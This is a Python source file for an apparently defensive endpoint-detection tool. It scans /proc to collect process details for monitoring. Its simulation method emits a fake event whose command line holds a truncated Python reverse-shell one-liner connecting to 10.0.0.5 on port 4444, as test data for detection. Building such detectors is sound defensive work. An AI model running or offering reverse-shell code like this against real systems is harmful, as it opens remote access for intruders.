import os
import time
import threading
import pwd
from typing import Dict, Any, List
from lotl_edr.collector.base import BaseCollector
from lotl_edr.utils.logger import setup_logger

logger = setup_logger("collector.proc_fs")

class ProcFSCollector(BaseCollector):
    def __init__(self, config: Dict[str, Any], callback=None):
        super().__init__("proc_fs", config, callback)
        self.interval = config.get("scan_interval_sec", 5)
        self.thread = None
        self.seen_pids = set()
        self.is_linux = os.path.exists("/proc")

    def start(self) -> None:
        self.running = True
        self.thread = threading.Thread(target=self._run, daemon=True)
        self.thread.start()
        logger.info("ProcFS collector started.")

    def stop(self) -> None:
        self.running = False
        if self.thread:
            self.thread.join(timeout=1.0)
        logger.info("ProcFS collector stopped.")

    def _run(self) -> None:
        try:
            self.scan()
        except Exception as e:
            logger.error(f"Error during initial ProcFS scan: {e}")

        while self.running:
            time.sleep(self.interval)
            if not self.running:
                break
            try:
                self.scan()
            except Exception as e:
                logger.error(f"Error during ProcFS scan: {e}")

    def scan(self) -> None:
        if not self.is_linux:
            self._simulate_scan()
            return

        current_pids = set()
        for name in os.listdir("/proc"):
            if not name.isdigit():
                continue
            pid = int(name)
            current_pids.add(pid)

            if pid in self.seen_pids:
                continue

            try:
                proc_info = self._parse_proc_pid(pid)
                if proc_info:
                    self.emit(proc_info)
            except Exception as e:
                logger.debug(f"Failed to scan PID {pid}: {e}")

        self.seen_pids = current_pids

    def _parse_proc_pid(self, pid: int) -> Dict[str, Any]:
        proc_dir = f"/proc/{pid}"

        try:
            exe = os.readlink(f"{proc_dir}/exe")
        except Exception:
            exe = ""

        try:
            with open(f"{proc_dir}/cmdline", "r", encoding="utf-8", errors="ignore") as f:
                cmdline = f.read().replace("\x00", " ").strip()
        except Exception:
            cmdline = ""

        ppid = 0
        uid = 0
        gid = 0
        username = "unknown"

        try:
            with open(f"{proc_dir}/status", "r") as f:
                for line in f:
                    if line.startswith("PPid:"):
                        ppid = int(line.split()[1])
                    elif line.startswith("Uid:"):
                        uid = int(line.split()[1])
                    elif line.startswith("Gid:"):
                        gid = int(line.split()[1])
        except Exception:
            pass

        if uid == 0:
            username = "root"
        else:
            try:
                username = pwd.getpwuid(uid).pw_name
            except KeyError:
                username = f"uid_{uid}"

        session_id = None
        try:
            with open(f"{proc_dir}/sessionid", "r") as f:
                sid_val = int(f.read().strip())
                if sid_val != 4294967295:
                    session_id = sid_val
        except Exception:
            pass

        tty = None
        try:
            fd0 = os.readlink(f"{proc_dir}/fd/0")
            if fd0.startswith("/dev/"):
                tty = fd0.replace("/dev/", "")
        except Exception:
            pass

        return {
            "pid": pid, "ppid": ppid, "uid": uid, "gid": gid, "username": username,
            "exe": exe, "cmdline": cmdline or (exe.split("/")[-1] if exe else f"proc_{pid}"),
            "session_id": session_id, "tty": tty,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
        }

    def _simulate_scan(self) -> None:
        sim_events = [
            {
                "pid": 5001, "ppid": 1200, "uid": 0, "gid": 0, "username": "root",
                "exe": "/usr/bin/whoami", "cmdline": "whoami", "session_id": 10, "tty": "pts/0",
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
            },
            {
                "pid": 5002, "ppid": 5001, "uid": 1000, "gid": 1000, "username": "attacker",
                "exe": "/usr/bin/python3",
                "cmdline": "python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.5',4444));",
                "session_id": 11, "tty": "pts/1",
                "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
            }
        ]

        for ev in sim_events:
            pid = ev["pid"]
            if pid not in self.seen_pids:
                self.emit(ev)
                self.seen_pids.add(pid)
